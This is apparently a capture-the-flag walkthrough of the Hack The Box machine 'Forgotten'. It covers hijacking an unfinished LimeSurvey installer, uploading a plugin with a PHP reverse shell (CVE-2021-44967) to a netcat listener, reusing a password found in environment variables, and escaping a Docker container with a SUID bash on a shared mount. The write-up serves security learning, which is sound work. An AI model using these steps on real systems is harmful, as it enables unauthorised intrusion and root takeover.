---
{"dg-publish":true,"permalink":"/ct-fs/htb/forgotten/","dgShowFileTree":true,"dg-note-properties":{}}
---

#linux #limesurvey #container_escape #docker #mysql #installer #SUID 


## Recon
![Pasted image 20261030135717.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030135717.png)

### Nmap:
```zsh
└─$ nmap -p- -Pn -sC -sV $IP -oA ./nmap_full
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-30 16:55 -0400
Stats: 0:03:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 91.35% done; ETC: 16:59 (0:00:18 remaining)
Nmap scan report for 10.129.234.81
Host is up (0.088s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 219.95 seconds

```
Initial portscanning shows SSH on 22, and a webserver on port 80. adding `forgotten.htb` to `/etc/hosts`.

### Web

#### Directory enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/forgotten/scanning]
└─$ gobuster dir -u http://forgotten.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,html,css,txt,js,json,zip,bak,old -t 10 | tee ./gobuster_80     
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forgotten.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              bak,old,html,css,php,txt,js,json,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
survey               (Status: 301) [Size: 315] [--> http://forgotten.htb/survey/]

```
Running the site through gobuster we get one hit for a `/survey/` subdirectory.

## Initial Access
### CVE-2021-44967
#### Manual Enumeration
![Pasted image 20261030140732.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030140732.png)
Visiting it in the browser we see it's an installer for Lime Survey version 6.3.7. We also note our server is running PHP 8.0.30 and MySQL.

#### Lime Survey Installer
![Pasted image 20261030145923.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030145923.png)
In the installer we see a section to setup a new MySQL db for this instance. I used a hint to figure out that we need to spin up a local MySQL db instance in order to route this installation correctly. Let's set one up in Docker.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/forgotten/exploit]
└─$ sudo docker run -p 3306:3306 --rm --name tmp-mysql -e MYSQL_ROOT_PASSWORD=password mysql:latest
2026-10-30 21:56:42+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 26.10.0-1.el9 started.
2026-10-30 21:56:42+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql'
2026-10-30 21:56:42+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 26.10.0-1.el9 started.
2026-10-30 21:56:42+00:00 [Note] [Entrypoint]: Initializing database files
2026-10-30T21:56:42.790234Z 0 [System] [MY-015017] [Server] MySQL Server Initialization - start.
2026-10-30T21:56:42.791025Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 26.10.0) initializing of server in progress as process 80
---SNIP---
2026-10-30T21:57:00.884007Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
****

```
We successfully get a container going with a mysql server and change the root password to 'password'. We then provide all that data to the survey installer and click next.

![Pasted image 20261030150002.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030150002.png)
Now that we've created the db we can click "populate".

![Pasted image 20261030150403.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030150403.png)
This creates all the user records and other db items for limesurvey. including an admin user on the server with the default password of 'password'. We click next.
![Pasted image 20261030150459.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030150459.png)
It prints the plaintext creds of the admin user and an Administration link to follow.

![Pasted image 20261030150708.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030150708.png)
After successfully logging in to lime we see it's running more specific version number: 6.3.7+231127. That version is specifically vulnerable to an RCE vuln in it's plugin upload functionality known commonly as CVE-2021-44967.

#### Abusing Plugins (CVE-2021-44967)
![Pasted image 20261030152042.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030152042.png)
I found this POC online to automatically abuse this vulnerability by uploading a malicious zip archive to the plugins section with a PHP reverse shell and a `config.xml` file and then calling back to a netcat listener for us. We start by editing the POC script to point to where we installed the Git Repo which hosts the `Y1LD1R1M.zip` archive.

![Pasted image 20261030152639.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030152639.png)
We then edit `config.xml` to include the major release of limesurvey we are using and rezip that back with `php-rev.php` into an archive we named `pwned.zip`

![Pasted image 20261030152615.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030152615.png)
We then go to plugins in the Configuration tab and choose "upload and install", select our archive and click Install.
![Pasted image 20261030152827.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030152827.png)
Click install on the next screen as well.

![Pasted image 20261030152916.png](/img/user/CTFs/HTB/Images/Forgotten%20Images/Pasted%20image%2020261030152916.png)
We successfully have installed the plugin with our reverse shell. Now let's get our shell.

#### Shell as limsvc
```zsh
┌──(kali㉿kali)-[~/…/forgotten/exploit/Limesurvey-RCE/zip]
└─$ curl http://forgotten.htb/survey/upload/plugins/Y1LD1R1M/php-rev.php

┌──(kali㉿kali)-[~/…/HTB/forgotten/exploit/Limesurvey-RCE]
└─$ nc -lnvp 8888                   
listening on [any] 8888 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.234.81] 33978
Linux efaa6f5097ed 6.8.0-1033-aws #35~22.04.1-Ubuntu SMP Wed Jul 23 17:51:00 UTC 2025 x86_64 GNU/Linux
 22:30:50 up  1:37,  0 users,  load average: 0.00, 0.00, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)

```
As you can see we successfully get a shell by curling to our plugin's shell script and successfully get a session as `limesvc`.

```zsh
$ script -qc /bin/bash /dev/null
limesvc@efaa6f5097ed:/$ groups
groups
limesvc sudo

limesvc@efaa6f5097ed:/$ sudo -l
sudo -l
Matching Defaults entries for limesvc on efaa6f5097ed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL

```
We run `script` to get a slightly better terminal shell and then enumerate our group membership and find we are a member of the sudoers group from inside the container, can run anything as `root`, but we don't yet have the password for this user yet.

```zsh
limesvc@efaa6f5097ed:/$ env
env
HOSTNAME=efaa6f5097ed
PHP_VERSION=8.0.30
APACHE_CONFDIR=/etc/apache2
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/
APACHE_LOG_DIR=/var/log/apache2
LANG=C
LS_COLORS=
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
LIMESURVEY_PASS=5W5HN4K4GCXf9E
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
LIMESURVEY_ADMIN=limesvc
APACHE_RUN_GROUP=limesvc
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=1
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
APACHE_RUN_DIR=/var/run/apache2
APACHE_ENVVARS=/etc/apache2/envvars
APACHE_RUN_USER=limesvc
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=/usr/bin/env

```
Looking at the stored env variables we see theres a `LIMESURVEY_PASS` variable.

```zsh
┌──(kali㉿kali)-[~/…/HTB/forgotten/exploit/Limesurvey-RCE]
└─$ ssh limesvc@forgotten.htb                                   
The authenticity of host 'forgotten.htb (10.129.234.81)' can't be established.
ED25519 key fingerprint is: SHA256:Dgu3MKOg2XUbjInyeAgQbBsHXIBePlc4jLIgssUKTt0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forgotten.htb' (ED25519) to the list of known hosts.
(limesvc@forgotten.htb) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct 30 22:36:32 UTC 2026

  System load:  0.06              Processes:             222
  Usage of /:   60.3% of 6.60GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.129.234.81
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

limesvc@forgotten:~$ ls
user.txt

limesvc@forgotten:~$ groups
limesvc

```
Attempting to use that password with ssh successfully nets us an ssh session on the server. And, as you can see, we successfully find `user.txt` in the home folder of `limesvc`. Additionally we confirm our previous shell was containerized as our groups via ssh just show `limesvc`. Since we already know that our user has full root permissions from within the container, let's try to escape it with those privileges on the main filesystem somehow.

## Privilege Escalation
### Container Escape
#### Container context enumeration
```zsh
root@efaa6f5097ed:~# findmnt
findmnt
TARGET                  SOURCE                     FSTYPE  OPTIONS
/                       overlay                    overlay rw,relatime,lowerdir=
|-/proc                 proc                       proc    rw,nosuid,nodev,noexe
| |-/proc/bus           proc[/bus]                 proc    ro,nosuid,nodev,noexe
| |-/proc/fs            proc[/fs]                  proc    ro,nosuid,nodev,noexe
| |-/proc/irq           proc[/irq]                 proc    ro,nosuid,nodev,noexe
| |-/proc/sys           proc[/sys]                 proc    ro,nosuid,nodev,noexe
| |-/proc/sysrq-trigger proc[/sysrq-trigger]       proc    ro,nosuid,nodev,noexe
| |-/proc/acpi          tmpfs                      tmpfs   ro,relatime,inode64
| |-/proc/kcore         tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
| |-/proc/keys          tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
| |-/proc/latency_stats tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
| |-/proc/timer_list    tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
| -/proc/scsi          tmpfs                      tmpfs   ro,relatime,inode64
|-/dev                  tmpfs                      tmpfs   rw,nosuid,size=65536k
| |-/dev/pts            devpts                     devpts  rw,nosuid,noexec,rela
| |-/dev/mqueue         mqueue                     mqueue  rw,nosuid,nodev,noexe
| -/dev/shm            shm                        tmpfs   rw,nosuid,nodev,noexe
|-/sys                  sysfs                      sysfs   ro,nosuid,nodev,noexe
| |-/sys/firmware       tmpfs                      tmpfs   ro,relatime,inode64
| -/sys/fs/cgroup      cgroup                     cgroup2 ro,nosuid,nodev,noexe
|-/etc/resolv.conf      /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf]
|                                                  ext4    rw,relatime,discard,e
|-/etc/hostname         /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname]
|                                                  ext4    rw,relatime,discard,e
|-/etc/hosts            /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts]
|                                                  ext4    rw,relatime,discard,e
-/var/www/html/survey  /dev/root[/opt/limesurvey] ext4    rw,relatime,discard,e
```
Running `findmnt` we see at the very bottom that the web directory holding the survey maps back to the internal filesystem at `/opt/limesurvey`. Since we have root permissions inside the container we should be able to write a SUID binary that will carry over to the main system.

#### Container Context SUID Abuse
```zsh
root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash .
cp /bin/bash .
root@efaa6f5097ed:/var/www/html/survey# ls
ls
LICENSE      assets	  installer	    plugins	      themes
README.md    bash	  locale	    psalm-all.xml     tmp
SECURITY.md  docs	  modules	    psalm-strict.xml  upload
admin	     gulpfile.js  node_modules	    psalm.xml	      vendor
application  index.php	  open-api-gen.php  setdebug.php
root@efaa6f5097ed:/var/www/html/survey# chmod +s bash
chmod +s bash
root@efaa6f5097ed:/var/www/html/survey# ls -lash
ls -lash
total 1.4M
4.0K drwxr-xr-x  15 limesvc  limesvc  4.0K Nov  5 20:46 .
4.0K drwxrwxrwt   1 www-data www-data 4.0K Dec  2  2023 ..
4.0K -rw-rw-r--   1 limesvc  limesvc  1.1K Nov 27  2023 .htaccess
 52K -rw-rw-r--   1 limesvc  limesvc   49K Nov 27  2023 LICENSE
4.0K -rw-rw-r--   1 limesvc  limesvc  2.5K Nov 27  2023 README.md
4.0K -rw-rw-r--   1 limesvc  limesvc   536 Nov 27  2023 SECURITY.md
4.0K drwxr-xr-x   2 limesvc  limesvc  4.0K Nov 27  2023 admin
4.0K drwxr-xr-x  15 limesvc  limesvc  4.0K Nov 27  2023 application
4.0K drwxr-xr-x  10 limesvc  limesvc  4.0K Nov 27  2023 assets
1.2M -rwsr-sr-x   1 root     root     1.2M Nov  5 20:46 bash
4.0K drwxr-xr-x   7 limesvc  limesvc  4.0K Nov 27  2023 docs
8.0K -rw-rw-r--   1 limesvc  limesvc  8.0K Nov 27  2023 gulpfile.js
8.0K -rw-rw-r--   1 limesvc  limesvc  5.5K Nov 27  2023 index.php
4.0K drwxr-xr-x   4 limesvc  limesvc  4.0K Nov 27  2023 installer
4.0K drwxr-xr-x 120 limesvc  limesvc  4.0K Nov 27  2023 locale
4.0K drwxr-xr-x   4 limesvc  limesvc  4.0K Nov 27  2023 modules
4.0K drwxr-xr-x  23 limesvc  limesvc  4.0K Nov 27  2023 node_modules
 12K -rwxrwxr-x   1 limesvc  limesvc  9.5K Nov 27  2023 open-api-gen.php
4.0K drwxr-xr-x   3 limesvc  limesvc  4.0K Nov 27  2023 plugins
4.0K -rw-rw-r--   1 limesvc  limesvc  2.2K Nov 27  2023 psalm-all.xml
4.0K -rw-rw-r--   1 limesvc  limesvc  1.1K Nov 27  2023 psalm-strict.xml
4.0K -rw-rw-r--   1 limesvc  limesvc  1.1K Nov 27  2023 psalm.xml
4.0K -rw-rw-r--   1 limesvc  limesvc  1.7K Nov 27  2023 setdebug.php
4.0K drwxr-xr-x   5 limesvc  limesvc  4.0K Nov 27  2023 themes
4.0K drwxr-xr-x   6 limesvc  limesvc  4.0K Nov  5 20:32 tmp
4.0K drwxr-xr-x   9 limesvc  limesvc  4.0K Nov 27  2023 upload
4.0K drwxr-xr-x  36 limesvc  limesvc  4.0K Nov 27  2023 vendor
```
First we start by gaining a root shell inside the container as `root` with `sudo -i`. We then navigate over to `/var/www/html/survey` and copy `/bin/bash` inside that folder. We then add a SUID permissions bit to it with `chmod +s /var/www/html/survey/bash`.
#### Shell as root on main filesystem
```zsh
limesvc@forgotten:/opt/limesurvey$ ls
total 1.4M
4.0K drwxr-xr-x  15 limesvc limesvc 4.0K Nov  5 20:46 .
4.0K drwxr-xr-x   4 root    root    4.0K Dec  2  2023 ..
4.0K -rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 .htaccess
 52K -rw-rw-r--   1 limesvc limesvc  49K Nov 27  2023 LICENSE
4.0K -rw-rw-r--   1 limesvc limesvc 2.5K Nov 27  2023 README.md
4.0K -rw-rw-r--   1 limesvc limesvc  536 Nov 27  2023 SECURITY.md
4.0K drwxr-xr-x   2 limesvc limesvc 4.0K Nov 27  2023 admin
4.0K drwxr-xr-x  15 limesvc limesvc 4.0K Nov 27  2023 application
4.0K drwxr-xr-x  10 limesvc limesvc 4.0K Nov 27  2023 assets
1.2M -rwsr-sr-x   1 root    root    1.2M Nov  5 20:46 bash
4.0K drwxr-xr-x   7 limesvc limesvc 4.0K Nov 27  2023 docs
8.0K -rw-rw-r--   1 limesvc limesvc 8.0K Nov 27  2023 gulpfile.js
8.0K -rw-rw-r--   1 limesvc limesvc 5.5K Nov 27  2023 index.php
4.0K drwxr-xr-x   4 limesvc limesvc 4.0K Nov 27  2023 installer
4.0K drwxr-xr-x 120 limesvc limesvc 4.0K Nov 27  2023 locale
4.0K drwxr-xr-x   4 limesvc limesvc 4.0K Nov 27  2023 modules
4.0K drwxr-xr-x  23 limesvc limesvc 4.0K Nov 27  2023 node_modules
 12K -rwxrwxr-x   1 limesvc limesvc 9.5K Nov 27  2023 open-api-gen.php
4.0K drwxr-xr-x   3 limesvc limesvc 4.0K Nov 27  2023 plugins
4.0K -rw-rw-r--   1 limesvc limesvc 2.2K Nov 27  2023 psalm-all.xml
4.0K -rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 psalm-strict.xml
4.0K -rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 psalm.xml
4.0K -rw-rw-r--   1 limesvc limesvc 1.7K Nov 27  2023 setdebug.php
4.0K drwxr-xr-x   5 limesvc limesvc 4.0K Nov 27  2023 themes
4.0K drwxr-xr-x   6 limesvc limesvc 4.0K Nov  5 20:32 tmp
4.0K drwxr-xr-x   9 limesvc limesvc 4.0K Nov 27  2023 upload
4.0K drwxr-xr-x  36 limesvc limesvc 4.0K Nov 27  2023 vendor
```
Jumping back over to our SSH session on the main filesystem we can see that we successfully copied bash and made it a SUID binary with `root` as its owner.

```zsh
limesvc@forgotten:/opt/limesurvey$ ./bash -p
bash-5.1# id
uid=2000(limesvc) gid=2000(limesvc) euid=0(root) egid=0(root) groups=0(root),2000(limesvc)
bash-5.1# ls -la /root
total 48
drwx------  8 root root 4096 Nov  5 19:56 .
drwxr-xr-x 19 root root 4096 Aug 14  2025 ..
lrwxrwxrwx  1 root root    9 Aug 14  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 18  2025 .cache
drwxr-xr-x  2 root root 4096 Dec  2  2023 .deploy
drwxr-xr-x  2 root root 4096 Dec  2  2023 .docker
drwxr-xr-x  3 root root 4096 Dec  2  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Dec  2  2023 .ssh
-rw-r--r--  1 root root    0 Dec  2  2023 .sudo_as_admin_successful
-rw-r--r--  1 root root  165 Aug 14  2025 .wget-hsts
-rw-r-----  1 root root   33 Nov  5 19:56 root.txt
drwx------  4 root root 4096 Dec  2  2023 snap
```
From there all we do is simply call the SUID bash we have in the folder with the `-p` flag to persist the owner's original permissions granting us a shell as `root`. We find `root.txt` inside `/root`. pwned


## Final Thoughts
>[!Takeaways]
>- Whenever you land in a reverse shell check for containerized environment
>- Whenever enumerating your container access be sure to check the mount points with `findmnt` to see if you have main filesystem access somewhere
>- Whenever you encounter an unfinished setup that asks for a server. Supply your attack machine if applicable (mysql db in this case)



